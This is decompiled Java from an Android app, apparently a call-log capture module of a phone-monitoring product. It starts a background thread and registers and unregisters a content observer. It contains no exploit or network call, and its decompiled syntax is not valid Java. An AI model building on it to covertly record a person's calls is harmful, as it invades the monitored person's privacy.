package com.vvt.capture.calllog.b;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Looper;
import android.telephony.TelephonyManager;
import com.vvt.ak.a;
import com.vvt.base.capture.i;

public class b
  implements com.vvt.base.capture.e
{
  private static final boolean a = a.a;
  private ContentObserver b;
  private ContentResolver c;
  private Looper d;
  private Thread e;
  private Context f;
  private TelephonyManager g;
  private i h;
  private e i;
  
  public b(Context paramContext, ContentResolver paramContentResolver)
  {
    this.f = paramContext;
    this.c = paramContentResolver;
  }
  
  public void a(i parami)
  {
    this.h = parami;
    Object localObject = this.e;
    if (localObject == null)
    {
      localObject = new com/vvt/capture/calllog/b/c;
      String str = "CallLogOT";
      ((c)localObject).<init>(this, str);
      this.e = ((Thread)localObject);
      localObject = this.e;
      ((Thread)localObject).start();
    }
  }
  
  public void b()
  {
    Object localObject = this.c;
    if (localObject != null)
    {
      localObject = this.b;
      if (localObject != null)
      {
        localObject = this.c;
        ContentObserver localContentObserver = this.b;
        ((ContentResolver)localObject).unregisterContentObserver(localContentObserver);
      }
    }
    localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      ((Looper)localObject).quit();
    }
    this.e = null;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */